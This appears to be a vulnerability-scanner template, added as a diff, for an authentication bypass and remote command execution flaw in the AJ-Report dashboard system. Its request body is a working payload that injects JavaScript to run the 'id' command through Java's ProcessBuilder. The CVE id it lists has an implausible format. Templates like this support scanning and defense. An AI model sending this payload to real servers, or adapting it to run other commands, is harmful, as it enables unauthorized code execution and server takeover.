@@ -1,0 +1,46 @@
+id: 2024-105161530
+
+info:
+  name: AJ-Report数据大屏系统 verification 存在认证绕过导致远程命令执行漏洞
+  author: k3ppf0r
+  severity: high
+  description: |  
+    AJ-Report开源数据大屏 verification;swagger-ui接口存在远程命令执行漏洞，未经身份验证的远程攻击者可以利用此类漏洞执行任意命令，写入后门文件，最终可获取服务器权限。
+  reference:
+    - https://www.ddpoc.com/DVB-2024-7001.html
+    - https://blog.csdn.net/qq_39894062/article/details/138435769
+  remediation: |
+    等待官方升级补丁,重启修复
+  classification:
+    cve-id: 2024-105161530
+    cvss-score: 9.5
+    cwe-id: CWE-94
+  metadata: 
+    date: 2024-05-06
+    version: | 
+      AJ-Report数据大屏系统
+    fofa-query: title="AJ-Report"
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
+        Host: your-ip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/json;charset=UTF-8
+        Connection: close
+        
+        {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, "\"code\":\"200\"")
+        condition: and
